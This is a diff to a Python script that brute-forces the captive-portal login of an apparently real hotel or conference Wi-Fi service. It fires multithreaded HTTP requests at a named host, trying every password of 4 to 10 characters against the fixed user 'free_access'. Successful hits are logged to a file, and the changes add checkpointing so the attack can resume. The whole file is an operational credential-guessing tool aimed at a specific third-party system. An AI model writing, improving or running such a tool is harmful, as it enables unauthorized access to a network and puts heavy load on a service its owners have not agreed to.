@@ -2,7 +2,6 @@
 
 import os
 import sys
-import atexit
 import concurrent.futures
 import urllib
 import time
@@ -14,25 +13,31 @@ import more_itertools
 generator = wordlist.Generator("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_,!$%&+-#/()=@")
 CHECK_PASSWORD_URL = "http://hsia.rieo.eu/process.php?trylogon=yes&language=en&javascript=enabled&ctype=conference&username=free_access&password={password}&connection=conference&terms=on&submit=Connect"
 
+PASSWORD_MIN_LENGHT=4
+PASSWORD_MAX_LENGTH=10
+
 WORKERS=100
 CHUNK=0
 STARTCHUNK=0
+STARTCHUNK=0
 TIMEOUT=10.0
 
+FILENAME, _ = os.path.splitext(os.path.basename(__file__)) 
+FILENAME += ".CHUNK"
+
 try:
-    with open("CHUNK") as infile:
-        CHUNK = int(infile.read())
+    with open(FILENAME) as infile:
+        STARTCHUNK = int(infile.read())
 except FileNotFoundError:
     pass
 
 def save_chunk():
-    with open("CHUNK", "w") as outfile:
+    with open(FILENAME, "w") as outfile:
         global CHUNK
-        CHUNK-=1 # repeat
-        outfile.write("%d" % CHUNK)
-        print(f"\n\nSaved {CHUNK} as current position.\n")
+        chunk_to_save = CHUNK
+        outfile.write("%d" % chunk_to_save)
+        print(f"\t\t\tSaved {chunk_to_save}\r", end="")
 
-atexit.register(save_chunk)
 
 os.environ["HTTP_PROXY"] = ""
 
@@ -41,7 +46,7 @@ if __name__ == "__main__":
     def check_password(chunk, password):
         url = CHECK_PASSWORD_URL.format(password=urllib.parse.quote_plus(password))
         res = requests.get(url, allow_redirects=False, timeout=TIMEOUT)
-        print(f"{chunk} try {password}               \r", end="")
+        print(f"{chunk} try {password} \r", end="")
         if res.status_code == 200:
             return res.text
         else:
@@ -51,12 +56,15 @@ if __name__ == "__main__":
     with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
         # Start the load operations and mark each future with its URL
         try:
-            for password_list_chunk in more_itertools.chunked(generator.generate(4,10), WORKERS*10):
+            for password_list_chunk in more_itertools.chunked(generator.generate(PASSWORD_MIN_LENGHT,PASSWORD_MAX_LENGTH), WORKERS*10):
                 CHUNK+=1
-                if STARTCHUNK>CHUNK:
+                if CHUNK < STARTCHUNK:
                     print(f"skipping {CHUNK} till {STARTCHUNK}         \r", end="")
                     continue # skip till STARTCHUNK
-
+                elif STARTCHUNK == CHUNK:
+                    print()
+                save_chunk()
+                print(f"\t\t\t\t\t\tStarting from {password_list_chunk[0]}\r", end="")
                 future_to_password = {executor.submit(check_password, CHUNK, password): password for password in password_list_chunk}
                 for future in concurrent.futures.as_completed(future_to_password):
                     password = future_to_password[future]
@@ -70,7 +78,7 @@ if __name__ == "__main__":
                         if res:
                             out=f"\n\nsucceeded with {password}:\n\n{res}"
                             print(out)
-                            with open("RESULT", "w") as outfile:
+                            with open("RESULT", "a") as outfile:
                                 outfile.write(out) 
                             executor.shutdown(wait=False)
         except KeyboardInterrupt:
